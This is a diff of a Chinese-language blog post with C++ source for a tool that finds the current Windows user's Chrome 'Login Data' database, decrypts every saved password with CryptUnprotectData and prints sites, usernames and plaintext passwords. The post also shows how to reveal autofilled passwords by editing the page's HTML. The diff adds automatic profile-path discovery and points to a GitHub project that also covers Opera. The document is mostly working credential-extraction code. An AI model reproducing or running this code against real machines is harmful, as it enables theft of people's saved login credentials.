@@ -1,22 +1,22 @@
 ﻿---
-title: Google browser login information extraction and password cracking
+title: Chrome login information extraction and password decryption
 tags: C++ Database Decrypt VS2019 SQLite3 Chrome
 edit: 2019-07-13
 categories: C++ Technology
 status: Completed
-description: Get the login information (URL, login name, password, etc.) automatically saved by Google Chrome and password cracking
+description: Get the login information (URL, login name, password, etc.) automatically saved by Google Chrome and password decryption
 ---
 #  查看浏览器已保存的密码
 
 1. 在地址栏输入chrome://settings/passwords来查看所有已保存的密码列表，搜索感兴趣的目标站点。
 
-   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Google%20browser%20login%20information%20extraction%20and%20password%20cracking/assert/01.png" width="70%">
+   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Chrome%20login%20information%20extraction%20and%20password%20decryption/assert/01.png" width="70%">
 
 2. 进入目标站点的登录页面，输入用户名前几位字符，让浏览器自动填充密码。右键审查元素（F12），选中密码区域，将密码字段代码的**type=”password”**改为**type=”text”**，即可查看明文密码。
 
-   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Google%20browser%20login%20information%20extraction%20and%20password%20cracking/assert/02.png" width="70%">
+   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Chrome%20login%20information%20extraction%20and%20password%20decryption/assert/02.png" width="70%">
 
-   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Google%20browser%20login%20information%20extraction%20and%20password%20cracking/assert/03.png" width="70%">
+   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Chrome%20login%20information%20extraction%20and%20password%20decryption/assert/03.png" width="70%">
 
 # 获得Chrome保存的登录信息和密码破解
 
@@ -30,11 +30,11 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
 
 成功读取数据库文件保存的信息，但password段无法显示，如下图
 
-<img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Google%20browser%20login%20information%20extraction%20and%20password%20cracking/assert/04.png" width="70%">
+<img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Chrome%20login%20information%20extraction%20and%20password%20decryption/assert/04.png" width="70%">
 
 选择Form view，查看十六进制格式，获得二次加密后的用户密码，如下图
 
-<img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Google%20browser%20login%20information%20extraction%20and%20password%20cracking/assert/05.png" width="70%">
+<img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Chrome%20login%20information%20extraction%20and%20password%20decryption/assert/05.png" width="70%">
 
 **注：**如果Chrome正在运行，无法使用SQLiteStudio打开数据库文件Login Data，可将该文件复制后再打开
 
@@ -54,30 +54,61 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
    #include <iostream>
    using namespace std;
    
-   char* U2G(const char* utf8);
+   string getProfilePath();
    string Password_Handle(char* input);
+   char* U2G(const char* utf8);
    
    #endif // !CryptUnProtectData.h
    
    ```
 
-   包含字符转换方法（U2G）和解密后密码处理方法（Password_Handle）。
+   包含获取存储登录信息文件路径方法（getProfilePath）和字符转换方法（U2G）和解密后密码处理方法（Password_Handle）。
 
-3. 执行模块`run.cpp`（包含数据库操作及密码解密）
+3. 获取路径模块`ProfilePath_Get.cpp`
+
+   ```c++
+   #include "CryptUnprotectData.h"
+   #include <ShlObj_core.h>
+   constexpr auto Get_failed = "get_ProfilePath Failed";
+   string getProfilePath() {
+   	char* appDataPath = (char*)malloc(sizeof(char) * MAX_PATH);
+   	if (appDataPath != NULL) {
+   		//获取Chrome 保存登录信息文件Login Data的路径
+   		SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);	// 获取当前用户的文件系统目录C:\Users\username\AppData\Local
+   		string profilePath = appDataPath;
+   		//printf("%s\n", appDataPath);
+   		profilePath = profilePath + "\\Google\\Chrome\\User Data\\Default\\";
+   		return profilePath;
+   	}
+   	else
+   		return Get_failed;
+   }
+   
+   ```
+   
+   **SHGetFolderPathA**：参考window开发文档[SHGetFolderPathA function](https://docs.microsoft.com/zh-cn/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpatha)
+   
+   
+   
+   
+   
+4. 执行模块`run.cpp`（包含数据库操作及密码解密）
 
    ```c++
    #include "CryptUnprotectData.h"
    #include <Wincrypt.h>
    #include "sqlite3.h"
    #pragma comment(lib,"crypt32.lib")
+   #pragma warning(disable:4996)
    
    int main(int argc, char* argv[])
    {
    	sqlite3* DB = NULL; // 一个打开的数据库实例
-   	sqlite3_stmt* stmt = NULL;//sqlite3_stmt 预编译语句对象. 由sqlite3_prepare()创建，由sqlite3_finalize()销毁
-   	const char* path = "C:/Users/Joker/Desktop/Login Data";//某个sql文件的路径
-   	char** dbResult; //是 char ** 类型，两个*号
-   	int nRow, nColumn;//表的行数，列数
+   	sqlite3_stmt* stmt = NULL;// sqlite3_stmt 预编译语句对象. 由sqlite3_prepare()创建，由sqlite3_finalize()销毁
+   	string LoginDataPath = getProfilePath() + "Login Data";
+   	const char* path = LoginDataPath.c_str();	// Login Data sql文件的路径
+   	char** dbResult; // 是 char ** 类型，两个*号
+   	int nRow, nColumn;// 表的行数，列数
    	int index;
    	DATA_BLOB DataOut;
    	DATA_BLOB Dataput;
@@ -92,7 +123,7 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
    		//开始查询，传入的 dbResult 已经是 char **，这里又加了一个 & 取地址符，传递进去的就成了char ***
    		const char* sql = "Select * from logins";
    		int result1 = sqlite3_prepare_v2(DB, sql, -1, &stmt, NULL);
-   		int result2 = sqlite3_get_table(DB, "Select * from logins", &dbResult, &nRow, &nColumn, NULL);	
+   		int result2 = sqlite3_get_table(DB, "Select * from logins", &dbResult, &nRow, &nColumn, NULL);
    		if (result1 == SQLITE_OK && result2 == SQLITE_OK)
    		{
    			//查询成功
@@ -106,17 +137,17 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
    				for (int j = 0; j < nColumn; j++)
    				{
    					if (!(strcmp(dbResult[j], "password_value")))//如果列名为password_value，则需要对该列的列值进行解密操作
-   					{	
+   					{
    						if (sqlite3_step(stmt) == SQLITE_ROW) {
-                               //初始化加密结构DataOut
-   							BYTE* pbDataInput = (BYTE*)sqlite3_column_text(stmt, j);							
+   							//初始化加密结构DataOut
+   							BYTE* pbDataInput = (BYTE*)sqlite3_column_text(stmt, j);
    							DWORD cbDataInput = sqlite3_column_bytes(stmt, j);
    							DataOut.pbData = pbDataInput;
    							DataOut.cbData = cbDataInput;
    						}
    						if (CryptUnprotectData(&DataOut, &pbtest, NULL, NULL, NULL, 0, &Dataput))
    						{
-   							string s=Password_Handle((char*)Dataput.pbData);//解密后的密码处理
+   							string s = Password_Handle((char*)Dataput.pbData);//解密后的密码处理
    							strcpy(dbResult[index], (char*)s.c_str());
    						}
    						else
@@ -130,7 +161,7 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
    				}
    				printf("--------------------------------------------------------------------------------\n");
    			}
-   		}		
+   		}
    		//清理语句句柄，准备执行下一个语句
    		sqlite3_finalize(stmt);
    		//到这里，不论数据库查询是否成功，都释放 char** 查询结果dbResult，使用 sqlite 提供的功能来释放
@@ -157,7 +188,11 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
 
    `CryptUnprotectData()`解密函数，其结构及功能介绍与具体使用见博文[Data encryption and decryption](https://www.shangzg.top/technology/Data-encryption-and-decryption-Data-encryption-and-decryption.html)。
 
-4. 密码处理模块`Password_Handle.cpp`
+   
+
+   
+
+5. 密码处理模块`Password_Handle.cpp`
 
    ```c++
    #include "CryptUnprotectData.h"
@@ -189,11 +224,15 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
 
    通过解密函数解密之后得到的密码会在尾部填充一些字段乱码，由于Chrome在加密时采用分组加密，每个密码单独分组，且分组长度相同（分组长度大于最大密码长度），空余部分用不影响读取的符号填充，所以直接解密后输出会在尾部出现乱码，需要对解密后的密码进行截取，只需要前面正确的部分。
 
-   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Google%20browser%20login%20information%20extraction%20and%20password%20cracking/assert/07.png" width="70%">
+   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Chrome%20login%20information%20extraction%20and%20password%20decryption/assert/07.png" width="70%">
 
    填充的乱码一般是十六进制的"\x1"—"\x9"和"\a"，"\b"，所以进行乱码之前的密码子串的截取。
 
-5. 字符格式转换模块`UTF8_Trans.cpp`
+   
+
+   
+
+6. 字符格式转换模块`UTF8_Trans.cpp`
 
    ```c++
    #include "CryptUnprotectData.h"
@@ -219,9 +258,13 @@ Chrome将用户的登录信息(保存的密码被加密)保存在SQLite数据库
 
    运行run.cpp，其结果如下图：
 
-   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Google%20browser%20login%20information%20extraction%20and%20password%20cracking/assert/06.png" width="70%">
+   <img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-12-Chrome%20login%20information%20extraction%20and%20password%20decryption/assert/06.png" width="70%">
 
    用户信息提取成功，并获得解密后的密码。
+
    
-   [C++工程项目文件](https://github.com/Cr7-joker/Google-browser-login-information-extraction-and-password-cracking)已上传到github。
+
+   **注**：如果Chrome浏览器处于打开状态可能读取信息失败！！！
+
+   [C++工程项目文件（包含Opera浏览器解密）](https://github.com/Cr7-joker/Google-browser-login-information-extraction-and-password-cracking)已上传到github。
 
